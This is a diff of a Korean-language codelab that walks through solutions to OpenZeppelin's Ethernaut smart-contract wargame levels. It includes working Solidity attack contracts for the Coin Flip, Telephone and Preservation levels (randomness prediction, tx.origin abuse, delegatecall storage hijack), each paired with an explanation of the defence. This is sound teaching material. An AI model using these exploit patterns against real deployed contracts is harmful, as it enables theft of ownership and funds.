@@ -47,21 +47,106 @@
         <p>사전에 풀어온 Ethernaut 레벨을 바탕으로 풀이 과정을 발표하고, 각 취약점이 발생한 원인과 방어 전략을 함께 토론합니다. 동일한 유형이라도 구현 방식에 따라 대응책이 달라질 수 있으므로, 서로의 솔루션을 비교하면서 정리합시다.</p>
 <p class="image-container"><img alt="No Spoilers" src="img/f1876fc335dfcfd0.png"></p>
 <h2 is-upgraded>Fallback</h2>
-<ul>
-<li><strong>Fallback</strong>: <code>receive()</code>/<code>fallback()</code>에서 <code>owner</code>를 덮어쓰는 실수를 악용해 컨트랙트를 장악할 수 있습니다. 비인가 호출이 넘어오지 못하도록 <code>onlyOwner</code> 가드와 초기 소유자 설정 로직을 분리합니다.</li>
-</ul>
+<p><a href="https://ethernaut.openzeppelin.com/level/1" target="_blank">Fallback</a>은 컨트랙트의 소유권을 탈취하고 잔액을 0으로 만드는 문제입니다.</p>
+<p>fallback 함수는 컨트랙트에 정의되어 있지 않은 함수가 호출될 경우 자동으로 호출되는 함수입니다. 이 문제에서는 트랙젝션을 보내는 클라이언트쪽 함수 sendTransaction을 사용해 컨트랙트를 호출하고 컨트랙트에 대응되는 함수가 없어서 fallback 함수가 실행됩니다. 이 때, fallback함수 내에서 몇 가지 조건(contribute되어 있음, value가 있음)을 만족하면 owner를 바꿀 수 있습니다.</p>
+<p class="image-container"><img alt="Fallback Contribute" src="img/1a9b46a544abf55c.png"></p>
+<p>먼저, 0.001 ether이하의 금액을 contribute 해줍시다.</p>
+<p class="image-container"><img alt="Fallback Attack" src="img/f237bb404b0d0fe7.png"></p>
+<p>sendTraction을 필요한 설정값(from, to, value)를 담아 fallback함수를 실행해줍니다.</p>
+<p class="image-container"><img alt="Fallback Tip" src="img/119508b01751de23.png"></p>
+<p>이처럼 단순히 입금만 받는 함수에 권한 변경 로직을 넣으면 위험할 수 있습니다. 가능한 fallback에는 최소 로직만 넣어야 하고, 이벤트만 찍고 끝내는 것을 권장합니다.</p>
+<aside class="special"><p><strong>TIP</strong> fallback 함수에는 fallback, receive 두 가지가 존재하는데, 메시지에 데이터(calldata)가 담겨 있으면 fallback이 호출되고, 비어있으면 receive가 호출됩니다. </p>
+</aside>
 <h2 is-upgraded>Fallout</h2>
-<ul>
-<li><strong>Fallout</strong>: 생성자 철자 오류로 인해 초기화를 누구나 호출할 수 있게 된 사례입니다. 배포 시점에만 실행되는 초기화 함수를 명확히 검증하고, 업그레이드형 컨트랙트라면 <code>initializer</code> 모디파이어를 적극 사용합니다.</li>
-</ul>
-<h2 is-upgraded>CoinFlip</h2>
-<ul>
-<li><strong>CoinFlip</strong>: 공개된 블록 데이터를 그대로 난수로 사용하는 바람에 결과를 예측할 수 있습니다. 난수는 오라클/VRF와 같이 오프체인에 의존하거나 커밋-리빌 패턴으로 생성해야 합니다.</li>
-</ul>
+<p><a href="https://ethernaut.openzeppelin.com/level/1" target="_blank">Fallout</a>은 컨트랙트의 소유권을 탈취하는 문제입니다.</p>
+<p>자세히 보면 스마트컨트랙트의 이름 <code>Fallout</code>과 생성자 함수의 이름 <code>Fal1out</code>이 다릅니다. 즉, <code>Fal1out</code>는 생성자가 아니라 함수입니다. 이 함수를 호출해서 소유권을 탈취합니다.</p>
+<p class="image-container"><img alt="Fallout Solution" src="img/29737130e0103efc.png"></p>
+<p class="image-container"><img alt="Fallout Tip" src="img/8ae79a1bb78f3438.png"></p>
+<p>solidity 0.4 이하의 버전에서는 함수의 이름을 컨트랙트의 이름과 동일하게 지정을 해주면 생성자로 취급합니다. 오타에 의한 문제를 방지하기 위해 그 이후의 버전부터는 <code>contructor</code>를 사용해서 생성자를 정의할 수 있도록 바뀌었습니다. 업그레이드형 컨트랙트의 <code>initializer</code> modifier를 사용하여 contructor를 대체합니다.</p>
+<pre><code language="language-solidity" class="language-solidity">contract FalloutLike is Initializable {
+    address public owner;
+    mapping(address =&gt; uint256) public allocations;
+
+    function initialize(address _owner) public initializer payable {
+        owner = _owner;
+        allocations[owner] = msg.value;
+    }
+}
+</code></pre>
+<p>Proxy 생성 후, Proxy 주소로 initialize를 호출해야 합니다.</p>
+<pre><code language="language-solidity" class="language-solidity">await FalloutLikeAtProxy.initialize(player, { value: ... });
+</code></pre>
+<aside class="special"><p><strong>스마트 컨트랙트의 업그레드를 위한 전략</strong></p>
+<p><strong>1. Contract migration</strong>: 새로운 스마트컨트랙트를 생성하고 이전 스마트컨트랙트의 상태정보를 마이그레이션하는 패턴입니다.</p>
+<p><strong>2. Data separation</strong>: 비즈니스로직과 상태정보들을 분리하는 패턴입니다.</p>
+<p><strong>3. Proxy patterns</strong>: 하지 않는 (immutable) 프록시 컨트랙트의 delegate 함수를 호출하여 수정된 비즈니스 스마트컨트랙트를 호출하는 패턴입니다. </p>
+<p><strong>4. Strategy pattern</strong>: 메인 스마트컨트랙트에는 변하지 않을 코어 비즈니스 로직을 구현하고, 나머지는 satellite(위성 컨트랙트)의 인터페이스를 활용해서 특정 기능을 수행하는 패턴. Proxy patterns 와 비슷하지만 로직을 가지고 있다는 점에서 차이점이 있습니다. </p>
+<p><strong>5. Diamond pattern</strong>: Proxy patterns의 개선된 버전으로, delegate 함수를 이용해서 한개 이상의 로직 컨트랙트를 호출합니다. 비즈니스 로직 컨트랙트를 여기에서는 facet(패싯)이라고 부릅니다. proxy 컨트랙트에는 호출할 서로 다른 facet의 address를 알기 위해서 function selector를 반드시 구현해 두어야 합니다.</p>
+</aside>
+<h2 is-upgraded>Coin Flip</h2>
+<p><a href="https://ethernaut.openzeppelin.com/level/3" target="_blank">Coin Flip</a>은 동전 던지기의 결과를 10번 연속으로 맞추는 문제입니다. 동전의 결과는 <code>coinFlip</code> 변수 값에 결정되고 이는 <code>blockValue</code>를 <code>FACTOR</code>로 나눈 값입니다. <code>FACTOR</code>는 고정된 값이고 <code>blockValue</code>는 block.number - 1를 해시한 값이므로 Flip은 <code>block.number</code>에 의해 결정됩니다.</p>
+<p>block.number는 <strong>현재 실행된 트랜잭션이 포함된 블록의 번호</strong> 입니다. 배포된 컨트랙트의 블록의 번호는 모두가 알 수 있고 이 번호를 가지고 같은 로직으로 시뮬레이션을 한다면 Flip값을 알 수 있습니다. 다음과 같이 공격할 컨트랙트를 짜주세요.</p>
+<pre><code language="language-solidity" class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ICoinFlip {
+    function flip(bool _guess) external returns (bool);
+}
+
+contract Attack {
+    ICoinFlip public target;
+    uint256 private FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _target) {
+        target = ICoinFlip(_target);
+    }
+
+    function attack() public {
+        // CoinFlip이랑 동일하게 blockValue 계산
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = (coinFlip == 1);
+
+        // 얻은 값을 얻어서 그대로 호출
+        target.flip(side);
+    }
+}
+</code></pre>
+<p>contract의 address를 가져와서 Deploy할 때 인자로 넣어줍시다.</p>
+<p class="image-container"><img alt="Coin Flip Address" src="img/977d9b5cddd39e78.png"></p>
+<p class="image-container"><img alt="Coin Flip Deploy" src="img/fa37626e6236b943.png"></p>
+<p>10번 Attack 트랜잭션 호출 후 제출합니다.</p>
+<p class="image-container"><img alt="Coin Flip Attack" src="img/601ce23b91f65451.png"></p>
 <h2 is-upgraded>Telephone</h2>
-<ul>
-<li><strong>Telephone</strong>: <code>tx.origin</code>을 검증에 사용해 중간 컨트랙트를 통한 호출을 허용해 버린 사례입니다. 인증에는 반드시 <code>msg.sender</code>와 역할 기반 제어를 사용합니다.</li>
-</ul>
+<p><a href="https://ethernaut.openzeppelin.com/level/4" target="_blank">Telephone</a>은 컨트랙트의 소유권을 탈취하는 문제입니다. 컨트랙트를 살펴보면 <code>tx.origin</code>과 <code>msg.sender</code>가 서로 다를 때만 owner를 바꿉니다. <code>tx.origin</code>는 맨 처음 트랜잭션을 보낸 EOA(지갑 주소)입니다. 즉, 컨트랙트를 통해 changeOwner를 호출하면 owner를 변경할 수 있습니다.</p>
+<p>다음과 같이 공격용 컨트랙트를 짜줍시다.</p>
+<pre><code language="language-solidity" class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ITelephone {
+    function changeOwner(address _owner) external;
+}
+
+contract TelephoneAttack {
+    ITelephone public target;
+
+    constructor(address _target) {
+        target = ITelephone(_target);
+    }
+
+    function attack(address _player) public {
+        target.changeOwner(_player);
+    }
+}
+</code></pre>
+<p class="image-container"><img alt="Telephone Address" src="img/ba6e59aa2b8e13ca.png"></p>
+<p>컨트랙트의 주소와 내 주소를 확인합니다.</p>
+<p class="image-container"><img alt="Telephone Deploy" src="img/b1514132706f1ccf.png"></p>
+<p class="image-container"><img alt="Telephone Attack" src="img/789e9ed401a89cc6.png"></p>
+<p>Telephone 컨트랙트 주소를 넣어 배포하고 Attack 트랜잭션을 호출합니다.</p>
+<p class="image-container"><img alt="Telephone Tip" src="img/75aa549b6512ac2a.png"></p>
+<p>tx.origin을 권한 체크에 쓰면, 누군가 나를 속여서 공격 컨트랙트를 호출하게 만들었을 때 그 컨트랙트가 내 지갑 주소를 가장해서 내 자산을 마음대로 빼갈 수 있습니다. 그래서 OpenZeppelin, ConsenSys 등의 감사기관이 권한 체크, 자산 전송, 보안 관련 로직에 <code>tx.origin</code>을 사용하는 것을 금지합니다.</p>
 <h2 is-upgraded>Token</h2>
 <ul>
 <li><strong>Token</strong></li>
@@ -157,10 +242,6 @@ modifier noReentrant() {
 }
 </code></pre>
 <p class="image-container"><img alt="Re-entrancy Tip" src="img/512c7c56dd105c91.png"></p>
-<h2 is-upgraded>Preservation</h2>
-<ul>
-<li><strong>Preservation</strong>: <code>delegatecall</code>을 통해 호출한 라이브러리의 스토리지 레이아웃 차이를 악용해 상태를 덮어썼습니다. 라이브러리 주소를 임의로 바꾸지 못하도록 고정하거나 업그레이드 시 접근 제어를 강화합니다.</li>
-</ul>
 <h2 is-upgraded>Elevator</h2>
 <p><a href="https://ethernaut.openzeppelin.com/level/11" target="_blank">Elevator</a>은 빌딩의 꼭대기에 도달하는 문제입니다. 컨트랙트에 보면 top이라는 boll 타입의 변수가 있는데 이 값을 true로 바꾸면 됩니다.</p>
 <p>컨트랙트에서 goTo 함수를 호출하면 그 컨트랙트의 주소(<code>msg.sender</code>)를 Building 타입으로 보고 <code>isLastFloor()</code>를 호출한다. 우리는 Building interface와 동일한 컨트랙트를 통해 top을 true로 바꿀 것이다.</p>
@@ -210,6 +291,34 @@ contract Building is IBuilding {
 <p>이 문제는 <code>isLastFloor</code>라는 함수가 순수(pure)하게 동작하지 않았기 때문에 발생한 문제입니다. <code>isLastFloor</code>는 입력에 따라 마지막 층인지만 확인하고 그 결과를 반환해야 하는데 실제론 toggle이라는 상태를 가지고 상태에 따라 반환값이 달라지게 구현하였습니다. 즉, 실제로 pure하게 동작해야 하는데 외부 컨트랙트를 통해 그렇지 않게 동작하였습니다.</p>
 <p>이를 막기 위해 함수의 정의(interface)에서 어떤 역할을 하는지 명시적으로 알려줄 필요가 있고 상태를 변경하지 않는 함수라면 view나 pure를 사용해야 합니다.</p>
 <p class="image-container"><img alt="Elevator Tip" src="img/ff3488b2adfce8f8.png"></p>
+<h2 is-upgraded>Preservation</h2>
+<p><a href="https://ethernaut.openzeppelin.com/level/15" target="_blank">Preservation</a>은 서로 다른 두 개의 시간대(timezone)에 대한 시간을 저장하기 위한 라이브러리를 사용한다. 생성자는 각각의 시간을 저장하기 위해 두 개의 라이브러리 인스턴스를 생성한다. 여기서 목표는 주어진 컨트랙트의 소유권을 탈취하는 것입니다.</p>
+<p>delegatecall은 호출된 컨트랙트의 코드를 현재 컨트랙트의 storage layout 기준으로 실행합니다. 각 Library의 storedTime은 slot 0에 있고 Preservation의 slot 0은 timeZone1Library 주소 이기 때문에 첫 번째 delegatecall을 이용해 timeZone1Library 주소를 원하는 값으로 덮어쓸 수 있습니다. 다음과 같이 공격 컨트랙트를 작성해주세요.</p>
+<pre><code language="language-solidity" class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract AttackPreservation {
+    // 동일한 slot layout
+    address public timeZone1Library; // slot0
+    address public timeZone2Library; // slot1
+    address public owner;            // slot2
+    uint256 public storedTime;       // slot3
+
+    function setTime(uint256 _time) public {
+        owner = tx.origin; // tx.origin은 player
+    }
+}
+</code></pre>
+<p class="image-container"><img alt="Preservation Deploy" src="img/516bf54470705517.png"></p>
+<p>컨트랙트를 배포하고 주소값을 받아와 주세요.</p>
+<p class="image-container"><img alt="Preservation Solution" src="img/333875e6f18a8eeb.png"></p>
+<p>먼저 <code>setFirstTime</code>을 호출할 때 공격 컨트랙트 주소를 전달해 첫 번째 타임존 라이브러리를 공격 컨트랙트로 바꿔주세요. 다시 <code>setFirstTime</code>을 호출해 공격 컨트랙트를 실행해주세요.</p>
+<p class="image-container"><img alt="Preservation Tip" src="img/1ca236d4e2095d90.png"></p>
+<aside class="special"><p><strong>TIP </strong>Storage slot</p>
+<p> Storage를 구성하는 32바이트(256비트)짜리 저장 공간 블록입니다. Solidity 컴파일러는 각 상태 변수를 slot에 순서대로 매핑해두고 접근합니다. 값이 32바이트보다 작으면 packing(32바이트로 채움) 됩니다.</p>
+</aside>
+<p>uint256, address, bool 전부 결국 32바이트 슬롯에 저장되기 때문에 <code>setFirstTime</code>의 인자로 주소를 넘겨도 정상적으로 실행됩니다. 이때, delegatecall처럼 다른 컨트랙트의 코드가 실행돼도 저장될 슬롯은 그대로 유지되므로(context-preserving) 취약점 발생할 수 있습니다.</p>
+<p>delegatecall을 사용할 때는 context preserving 된다는 시실과 storage 변수들이 어떻게 저장되고 접근되는지 이해가 필요하다.</p>
 
 
       </google-codelab-step>
@@ -249,8 +358,8 @@ contract Building is IBuilding {
 </ol>
 <h2 is-upgraded>참고 자료</h2>
 <ol type="1">
-<li><a href="https://docs.openzeppelin.com/contracts" target="_blank">openzeppelin의 contract관련 개발 문서</a></li>
-<li><a href="https://ethernaut.openzeppelin.com" target="_blank">ethernaut</a></li>
+<li><a href="https://ethernaut.openzeppelin.com" target="_blank">Ethernaut</a></li>
+<li><a href="https://piatoss3612.tistory.com/category/Solidity/Hacking" target="_blank">Ethernaut 풀이</a></li>
 </ol>
 
 
